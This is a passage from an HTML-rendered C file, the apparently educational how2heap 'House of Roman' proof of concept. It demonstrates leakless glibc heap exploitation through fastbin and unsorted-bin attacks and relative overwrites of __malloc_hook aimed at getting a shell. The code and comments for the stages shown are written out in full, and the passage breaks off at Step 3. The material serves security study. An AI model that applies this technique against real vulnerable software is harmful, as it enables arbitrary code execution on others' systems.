class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE     <span class="comment">/* for RTLD_NEXT */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* shell = <span class="string">&quot;/bin/sh\x00&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">Technique was tested on GLibC 2.23, 2.24 via the glibc_build.sh script inside of how2heap on Ubuntu 16.04. 2.25 was tested on Ubuntu 17.04.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Compile: gcc -fPIE -pie house_of_roman.c -o house_of_roman</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">POC written by Maxwell Dulin (Strikeout) </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Use this in order to turn off printf buffering (messes with heap alignment)</span></span><br><span class="line"><span class="function"><span class="type">void</span>* <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">setvbuf</span>(stdout, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">	<span class="built_in">setvbuf</span>(stdin, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* </span></span><br><span class="line"><span class="comment">	The main goal of this technique is to create a **leakless** heap </span></span><br><span class="line"><span class="comment">	exploitation technique in order to get a shell. This is mainly </span></span><br><span class="line"><span class="comment">	done using **relative overwrites** in order to get pointers in </span></span><br><span class="line"><span class="comment">	the proper locations without knowing the exact value of the pointer.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	The first step is to get a pointer inside of __malloc_hook. This </span></span><br><span class="line"><span class="comment">	is done by creating a fastbin bin that looks like the following: </span></span><br><span class="line"><span class="comment">	ptr_to_chunk -&gt; ptr_to_libc. Then, we alter the ptr_to_libc</span></span><br><span class="line"><span class="comment">	 (with a relative overwrite) to point to __malloc_hook. </span></span><br><span class="line"><span class="comment">			</span></span><br><span class="line"><span class="comment">	The next step is to run an unsorted bin attack on the __malloc_hook </span></span><br><span class="line"><span class="comment">	(which is now controllable from the previous attack).  Again, we run </span></span><br><span class="line"><span class="comment">	the unsorted_bin attack by altering the chunk-&gt;bk with a relative overwrite. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Finally, after launching the unsorted_bin attack to put a libc value </span></span><br><span class="line"><span class="comment">	inside of __malloc_hook, we use another relative overwrite on the </span></span><br><span class="line"><span class="comment">	value of __malloc_hook to point to a one_gadget, system or some other function.</span></span><br><span class="line"><span class="comment">	</span></span><br><span class="line"><span class="comment">	Now, the next time we run malloc we pop a shell! :) </span></span><br><span class="line"><span class="comment">	However, this does come at a cost: 12 bits of randomness must be </span></span><br><span class="line"><span class="comment">	brute forced (0.02% chance) of working.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	The original write up for the *House of Roman* can be found at</span></span><br><span class="line"><span class="comment">	 https://gist.github.com/romanking98/9aab2804832c0fb46615f025e8ffb0bc#assumptions.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	This technique requires the ability to edit fastbin and unsorted bin </span></span><br><span class="line"><span class="comment">	pointers via UAF or overflow of some kind. Additionally, good control </span></span><br><span class="line"><span class="comment">	over the allocations sizes and freeing is required for this technique.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line"></span><br><span class="line">	<span class="type">char</span>* introduction = <span class="string">&quot;\nWelcome to the House of Roman\n\n&quot;</span></span><br><span class="line">			     <span class="string">&quot;This is a heap exploitation technique that is LEAKLESS.\n&quot;</span></span><br><span class="line">			     <span class="string">&quot;There are three stages to the attack: \n\n&quot;</span></span><br><span class="line">			     <span class="string">&quot;1. Point a fastbin chunk to __malloc_hook.\n&quot;</span></span><br><span class="line">			     <span class="string">&quot;2. Run the unsorted_bin attack on __malloc_hook.\n&quot;</span></span><br><span class="line">			     <span class="string">&quot;3. Relative overwrite on main_arena at __malloc_hook.\n\n&quot;</span></span><br><span class="line">			     <span class="string">&quot;All of the stuff mentioned above is done using two main concepts:\n&quot;</span></span><br><span class="line">                             <span class="string">&quot;relative overwrites and heap feng shui.\n\n&quot;</span></span><br><span class="line">			     <span class="string">&quot;However, this technique comes at a cost:\n&quot;</span></span><br><span class="line">                             <span class="string">&quot;12-bits of entropy need to be brute forced.\n&quot;</span></span><br><span class="line">			     <span class="string">&quot;That means this technique only work 1 out of every 4096 tries or 0.02%.\n&quot;</span></span><br><span class="line">			     <span class="string">&quot;**NOTE**: For the purpose of this exploit, we set the random values in order to make this consisient\n\n\n&quot;</span>;</span><br><span class="line">	<span class="built_in">puts</span>(introduction);	</span><br><span class="line">	<span class="built_in">init</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*	</span></span><br><span class="line"><span class="comment">	Part 1: Fastbin Chunk points to __malloc_hook</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Getting the main_arena in a fastbin chunk ordering is the first step.</span></span><br><span class="line"><span class="comment">	This requires a ton of heap feng shui in order to line this up properly. </span></span><br><span class="line"><span class="comment">	However, at a glance, it looks like the following:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	First, we need to get a chunk that is in the fastbin with a pointer to</span></span><br><span class="line"><span class="comment">	a heap chunk in the fd. </span></span><br><span class="line"><span class="comment">	Second, we point this chunk to a pointer to LibC (in another heap chunk). </span></span><br><span class="line"><span class="comment">	All of the setup below is in order to get the configuration mentioned </span></span><br><span class="line"><span class="comment">	above setup to perform the relative overwrites. &quot;;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Getting the pointer to libC can be done in two ways: </span></span><br><span class="line"><span class="comment">			- A split from a chunk in the small/large/unsorted_bins </span></span><br><span class="line"><span class="comment">				gets allocated to a size of 0x70. </span></span><br><span class="line"><span class="comment">			- Overwrite the size of a small/large chunk used previously to 0x71.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	For the sake of example, this uses the first option because it </span></span><br><span class="line"><span class="comment">	requires less vulnerabilities.	</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Step 1: Point fastbin chunk to __malloc_hook\n\n&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Setting up chunks for relative overwrites with heap feng shui.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Use this as the UAF chunk later to edit the heap pointer later to point to the LibC value.	</span></span><br><span class="line">	<span class="type">uint8_t</span>* fastbin_victim = <span class="built_in">malloc</span>(<span class="number">0x60</span>); </span><br><span class="line"></span><br><span class="line">	<span class="comment">// Allocate this in order to have good alignment for relative </span></span><br><span class="line">	<span class="comment">// offsets later (only want to overwrite a single byte to prevent </span></span><br><span class="line">	<span class="comment">// 4 bits of brute on the heap).</span></span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Offset 0x100</span></span><br><span class="line">	<span class="type">uint8_t</span>* main_arena_use = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// Offset 0x190</span></span><br><span class="line">	<span class="comment">// This ptr will be used for a relative offset on the &#x27;main_arena_use&#x27; chunk</span></span><br><span class="line">	<span class="type">uint8_t</span>* relative_offset_heap = <span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// Free the chunk to put it into the unsorted_bin. </span></span><br><span class="line">	<span class="comment">// This chunk will have a pointer to main_arena + 0x68 in both the fd and bk pointers.</span></span><br><span class="line">	<span class="built_in">free</span>(main_arena_use);</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* </span></span><br><span class="line"><span class="comment">	Get part of the unsorted_bin chunk (the one that we just freed). </span></span><br><span class="line"><span class="comment">	We want this chunk because the fd and bk of this chunk will </span></span><br><span class="line"><span class="comment">	contain main_arena ptrs (used for relative overwrite later).</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	The size is particularly set at 0x60 to put this into the 0x70 fastbin later. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	This has to be the same size because the __malloc_hook fake </span></span><br><span class="line"><span class="comment">	chunk (used later) uses the fastbin size of 0x7f. There is</span></span><br><span class="line"><span class="comment">	 a security check (within malloc) that the size of the chunk matches the fastbin size.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Allocate chunk that has a pointer to LibC main_arena inside of fd ptr.\n&quot;</span>);</span><br><span class="line"><span class="comment">//Offset 0x100. Has main_arena + 0x68 in fd and bk.</span></span><br><span class="line">	<span class="type">uint8_t</span>* fake_libc_chunk = <span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//// <span class="doctag">NOTE:</span> This is NOT part of the exploit... \\\</span></span><br><span class="line"><span class="comment">	// The __malloc_hook is calculated in order for the offsets to be found so that this exploit works on a handful of versions of GLibC. </span></span><br><span class="line">	<span class="type">long</span> <span class="type">long</span> __malloc_hook = ((<span class="type">long</span>*)fake_libc_chunk)[<span class="number">0</span>] - <span class="number">0xe8</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">// We need the filler because the overwrite below needs </span></span><br><span class="line">	<span class="comment">// to have a ptr in the fd slot in order to work. </span></span><br><span class="line">	<span class="comment">//Freeing this chunk puts a chunk in the fd slot of &#x27;fastbin_victim&#x27; to be used later. </span></span><br><span class="line">	<span class="built_in">free</span>(relative_offset_heap);	</span><br><span class="line"></span><br><span class="line">    	<span class="comment">/* </span></span><br><span class="line"><span class="comment">    	Create a UAF on the chunk. Recall that the chunk that fastbin_victim </span></span><br><span class="line"><span class="comment">	points to is currently at the offset 0x190 (heap_relative_offset).</span></span><br><span class="line"><span class="comment">     	*/</span></span><br><span class="line">	<span class="built_in">free</span>(fastbin_victim);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Now, we start doing the relative overwrites, since that we have </span></span><br><span class="line"><span class="comment">	the pointers in their proper locations. The layout is very important to </span></span><br><span class="line"><span class="comment">	understand for this.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Current heap layout: </span></span><br><span class="line"><span class="comment">	0x0:   fastbin_victim       - size 0x70 </span></span><br><span class="line"><span class="comment">	0x70:  alignment_filler     - size 0x90</span></span><br><span class="line"><span class="comment">	0x100: fake_libc_chunk      - size 0x70</span></span><br><span class="line"><span class="comment">	0x170: leftover_main        - size 0x20</span></span><br><span class="line"><span class="comment">	0x190: relative_offset_heap - size 0x70 </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	bin layout: </span></span><br><span class="line"><span class="comment">			fastbin:  fastbin_victim -&gt; relative_offset_heap</span></span><br><span class="line"><span class="comment">			unsorted: leftover_main</span></span><br><span class="line"><span class="comment">	</span></span><br><span class="line"><span class="comment">	Now, the relative overwriting begins:</span></span><br><span class="line"><span class="comment">	Recall that fastbin_victim points to relative_offset_heap </span></span><br><span class="line"><span class="comment">	(which is in the 0x100-0x200 offset range). The fastbin uses a singly </span></span><br><span class="line"><span class="comment">	linked list, with the next chunk in the &#x27;fd&#x27; slot.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	By *partially* editing the fastbin_victim&#x27;s last byte (from 0x90 </span></span><br><span class="line"><span class="comment">	to 0x00) we have moved the fd pointer of fastbin_victim to </span></span><br><span class="line"><span class="comment">	fake_libc_chunk (at offset 0x100).</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Also, recall that fake_libc_chunk had previously been in the unsorted_bin. </span></span><br><span class="line"><span class="comment">	Because of this, it has a fd pointer that points to main_arena + 0x68. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Now, the fastbin looks like the following: </span></span><br><span class="line"><span class="comment">	fastbin_victim -&gt; fake_libc_chunk -&gt;(main_arena + 0x68).</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	The relative overwrites (mentioned above) will be demonstrates step by step below.</span></span><br><span class="line"><span class="comment">	</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\</span></span><br><span class="line"><span class="string">Overwrite the first byte of a heap chunk in order to point the fastbin chunk\n\</span></span><br><span class="line"><span class="string">to the chunk with the LibC address\n&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\</span></span><br><span class="line"><span class="string">Fastbin 0x70 now looks like this:\n\</span></span><br><span class="line"><span class="string">heap_addr -&gt; heap_addr2 -&gt; LibC_main_arena\n&quot;</span>);</span><br><span class="line">	fastbin_victim[<span class="number">0</span>] = <span class="number">0x00</span>; <span class="comment">// The location of this is at 0x100. But, we only want to overwrite the first byte. So, we put 0x0 for this.</span></span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	Now, we have a fastbin that looks like the following: </span></span><br><span class="line"><span class="comment">			0x70: fastbin_victim -&gt; fake_libc_chunk -&gt; (main_arena + 0x68)</span></span><br><span class="line"><span class="comment">	</span></span><br><span class="line"><span class="comment">	We want the fd ptr in fake_libc_chunk to point to something useful. </span></span><br><span class="line"><span class="comment">	So, let&#x27;s edit this to point to the location of the __malloc_hook. </span></span><br><span class="line"><span class="comment">	This way, we can get control of a function ptr.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	To do this, we need a valid malloc size. Within the __memalign_hook </span></span><br><span class="line"><span class="comment">	is usually an address that usually starts with 0x7f. </span></span><br><span class="line"><span class="comment">	Because __memalign_hook value is right before this are all 0s, </span></span><br><span class="line"><span class="comment">	we could use a misaligned chunk to get this to work as a valid size in </span></span><br><span class="line"><span class="comment">	the 0x70 fastbin.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	This is where the first 4 bits of randomness come into play. </span></span><br><span class="line"><span class="comment">	The first 12 bits of the LibC address are deterministic for the address. </span></span><br><span class="line"><span class="comment">	However, the next 4 (for a total of 2 bytes) are not. </span></span><br><span class="line"><span class="comment">	</span></span><br><span class="line"><span class="comment">	So, we have to brute force 2^4 different possibilities (16) </span></span><br><span class="line"><span class="comment">	in order to get this in the correct location. This &#x27;location&#x27; </span></span><br><span class="line"><span class="comment">	is different for each version of GLibC (should be noted).</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	After doing this relative overwrite, the fastbin looks like the following:</span></span><br><span class="line"><span class="comment">			0x70: fastbin_victim -&gt; fake_libc_chunk -&gt; (__malloc_hook - 0x23).</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">/* </span></span><br><span class="line"><span class="comment">	Relatively overwrite the main_arena pointer to point to a valid </span></span><br><span class="line"><span class="comment">	chunk close to __malloc_hook.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	///// <span class="doctag">NOTE:</span> In order to make this exploit consistent </span></span><br><span class="line"><span class="comment">	(not brute forcing with hardcoded offsets), we MANUALLY set the values. \\\</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	In the actual attack, this values would need to be specific </span></span><br><span class="line"><span class="comment">	to a version and some of the bits would have to be brute forced </span></span><br><span class="line"><span class="comment">	(depending on the bits).</span></span><br><span class="line"><span class="comment">	*/</span> </span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;\</span></span><br><span class="line"><span class="string">Use a relative overwrite on the main_arena pointer in the fastbin.\n\</span></span><br><span class="line"><span class="string">Point this close to __malloc_hook in order to create a fake fastbin chunk\n&quot;</span>);</span><br><span class="line">	<span class="type">long</span> <span class="type">long</span> __malloc_hook_adjust = __malloc_hook - <span class="number">0x23</span>; <span class="comment">// We substract 0x23 from the malloc because we want to use a 0x7f as a valid fastbin chunk size.</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// The relative overwrite</span></span><br><span class="line">	<span class="type">int8_t</span> byte1 = (__malloc_hook_adjust) &amp; <span class="number">0xff</span>; 	</span><br><span class="line">	<span class="type">int8_t</span> byte2 = (__malloc_hook_adjust &amp; <span class="number">0xff00</span>) &gt;&gt; <span class="number">8</span>; </span><br><span class="line">	fake_libc_chunk[<span class="number">0</span>] = byte1; <span class="comment">// Least significant bytes of the address.</span></span><br><span class="line">	fake_libc_chunk[<span class="number">1</span>] = byte2; <span class="comment">// The upper most 4 bits of this must be brute forced in a real attack.</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// Two filler chunks prior to the __malloc_hook chunk in the fastbin. </span></span><br><span class="line">	<span class="comment">// These are fastbin_victim and fake_libc_chunk.</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Get the fake chunk pointing close to __malloc_hook\n&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\</span></span><br><span class="line"><span class="string">In a real exploit, this would fail 15/16 times\n\</span></span><br><span class="line"><span class="string">because of the final half byet of the malloc_hook being random\n&quot;</span>);	</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// If the 4 bit brute force did not work, this will crash because </span></span><br><span class="line">	<span class="comment">// of the chunk size not matching the bin for the chunk. </span></span><br><span class="line">	<span class="comment">// Otherwise, the next step of the attack can begin.</span></span><br><span class="line">	<span class="type">uint8_t</span>* malloc_hook_chunk = <span class="built_in">malloc</span>(<span class="number">0x60</span>);	</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Passed step 1 =)\n\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	Part 2: Unsorted_bin attack </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Now, we have control over the location of the __malloc_hook. </span></span><br><span class="line"><span class="comment">	However, we do not know the address of LibC still. So, we cannot </span></span><br><span class="line"><span class="comment">	do much with this attack. In order to pop a shell, we need </span></span><br><span class="line"><span class="comment">	to get an address at the location of the __malloc_hook.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	We will use the unsorted_bin attack in order to change the value </span></span><br><span class="line"><span class="comment">	of the __malloc_hook with the address of main_arena + 0x68. </span></span><br><span class="line"><span class="comment">	For more information on the unsorted_bin attack, review </span></span><br><span class="line"><span class="comment">	https://github.com/shellphish/how2heap/blob/master/glibc_2.26/unsorted_bin_attack.c.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	For a brief overview, the unsorted_bin attack allows us to write</span></span><br><span class="line"><span class="comment">	main_arena + 0x68 to any location by altering the chunk-&gt;bk of</span></span><br><span class="line"><span class="comment">	an unsorted_bin chunk. We will choose to write this to the </span></span><br><span class="line"><span class="comment">	location of __malloc_hook.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	After we overwrite __malloc_hook with the main_arena, we will </span></span><br><span class="line"><span class="comment">	edit the pointer (with a relative overwrite) to point to a </span></span><br><span class="line"><span class="comment">	one_gadget for immediate code execution.</span></span><br><span class="line"><span class="comment">			</span></span><br><span class="line"><span class="comment">	Again, this relative overwrite works well but requires an additional </span></span><br><span class="line"><span class="comment">	1 byte (8 bits) of brute force.</span></span><br><span class="line"><span class="comment">	This brings the chances of a successful attempt up to 12 bits of </span></span><br><span class="line"><span class="comment">	randomness. This has about a 1/4096 or a 0.0244% chance of working.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	</span></span><br><span class="line"><span class="comment">	The steps for phase two of the attack are explained as we go below.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\</span></span><br><span class="line"><span class="string">Start Step 2: Unsorted_bin attack\n\n\</span></span><br><span class="line"><span class="string">The unsorted bin attack gives us the ability to write a\n\</span></span><br><span class="line"><span class="string">large value to ANY location. But, we do not control the value\n\</span></span><br><span class="line"><span class="string">This value is always main_arena + 0x68. \n\</span></span><br><span class="line"><span class="string">We point the unsorted_bin attack to __malloc_hook for a \n\</span></span><br><span class="line"><span class="string">relative overwrite later.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">// Get the chunk to corrupt. Add another ptr in order to prevent consolidation upon freeing.</span></span><br><span class="line">	</span><br><span class="line">	<span class="type">uint8_t</span>* unsorted_bin_ptr = <span class="built_in">malloc</span>(<span class="number">0x80</span>);	</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x30</span>); <span class="comment">// Don&#x27;t want to consolidate</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Put chunk into unsorted_bin\n&quot;</span>);</span><br><span class="line">	<span class="comment">// Free the chunk to create the UAF</span></span><br><span class="line">	<span class="built_in">free</span>(unsorted_bin_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* /// <span class="doctag">NOTE:</span> The last 4 bits of byte2 would have been brute forced earlier. \\\ </span></span><br><span class="line"><span class="comment">	 However, for the sake of example, this has been calculated dynamically. </span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	__malloc_hook_adjust = __malloc_hook - <span class="number">0x10</span>; <span class="comment">// This subtract 0x10 is needed because of the chunk-&gt;fd doing the actual overwrite on the unsorted_bin attack.</span></span><br><span class="line">	byte1 = (__malloc_hook_adjust) &amp; <span class="number">0xff</span>; 	</span><br><span class="line">	byte2 = (__malloc_hook_adjust &amp; <span class="number">0xff00</span>) &gt;&gt; <span class="number">8</span>; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">// Use another relative offset to overwrite the ptr of the chunk-&gt;bk pointer.</span></span><br><span class="line">	<span class="comment">// From the previous brute force (4 bits from before) we </span></span><br><span class="line">	<span class="comment">// know where the location of this is at. It is 5 bytes away from __malloc_hook.</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Overwrite last two bytes of the chunk to point to __malloc_hook\n&quot;</span>);</span><br><span class="line">	unsorted_bin_ptr[<span class="number">8</span>] = byte1; <span class="comment">// Byte 0 of bk. 	</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// //// <span class="doctag">NOTE:</span> Normally, the second half of the byte would HAVE to be brute forced. However, for the sake of example, we set this in order to make the exploit consistent. ///</span></span><br><span class="line">	unsorted_bin_ptr[<span class="number">9</span>] = byte2; <span class="comment">// Byte 1 of bk. The second 4 bits of this was brute forced earlier, the first 4 bits are static.</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">/* </span></span><br><span class="line"><span class="comment">	Trigger the unsorted bin attack.</span></span><br><span class="line"><span class="comment">	This will write the value of (main_arena + 0x68) to whatever is in the bk ptr + 0x10.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	A few things do happen though: </span></span><br><span class="line"><span class="comment">		- This makes the unsorted bin (hence, small and large too) </span></span><br><span class="line"><span class="comment">		   unusable. So, only allocations previously in the fastbin can only be used now.</span></span><br><span class="line"><span class="comment">		- If the same size chunk (the unsorted_bin attack chunk) </span></span><br><span class="line"><span class="comment">		   is NOT malloc&#x27;ed, the program will crash immediately afterwards. </span></span><br><span class="line"><span class="comment">		   So, the allocation request must be the same as the unsorted_bin chunk.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	The first point is totally fine (in this attack). But, in more complicated </span></span><br><span class="line"><span class="comment">	programming, this can be an issue.</span></span><br><span class="line"><span class="comment">	The second just requires us to do the same size allocaton as the current chunk.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Trigger the unsorted_bin attack\n&quot;</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x80</span>); <span class="comment">// Trigger the unsorted_bin attack to overwrite __malloc_hook with main_arena + 0x68</span></span><br><span class="line"></span><br><span class="line">	<span class="type">long</span> <span class="type">long</span> system_addr = (<span class="type">long</span> <span class="type">long</span>)<span class="built_in">dlsym</span>(RTLD_NEXT, <span class="string">&quot;system&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Passed step 2 =)\n\n\n&quot;</span>);</span><br><span class="line">	<span class="comment">/* </span></span><br><span class="line"><span class="comment">	Step 3: Set __malloc_hook to system</span></span><br><span class="line"><span class="comment">	</span></span><br><span class="line"><span class="comment">	The chunk itself is allocated 19 bytes away from __malloc_hook. </span></span><br><span class="line"><span class="comment">	So, we use a realtive overwrite (again) in order to partially overwrite </span></span><br><span class="line"><span class="comment">	the main_arena pointer (from unsorted_bin attack) to point to system.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	In a 